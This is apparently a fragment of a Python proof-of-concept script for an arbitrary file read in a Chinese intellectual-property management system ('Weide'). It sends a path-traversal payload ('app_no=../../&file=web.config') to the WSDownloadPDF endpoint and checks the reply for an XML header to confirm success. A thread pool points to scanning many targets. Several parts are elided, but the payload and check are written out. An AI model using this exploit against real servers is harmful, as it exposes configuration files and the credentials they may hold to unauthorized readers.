#唯徳知识产权-WSDownloadPDF任意文件读取
import requests,argparse,sys,re,json,random
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings() 
def poc(target):
    payload="/wxInterface/Case.ashx/WSDownloadPDF?file_type=1&app_no=../../&file=web.config"
    user_agents = [
    ...
    try:
        ...
        if res1.status_code ==200:
            ...
            if 'xml version="1.0" encoding="utf-8"' in res2.text:
...
def banner():
    pass
def main():
    parse=argparse.ArgumentParser(description="唯徳知识产权-WSDownloadPDF任意文件读取")
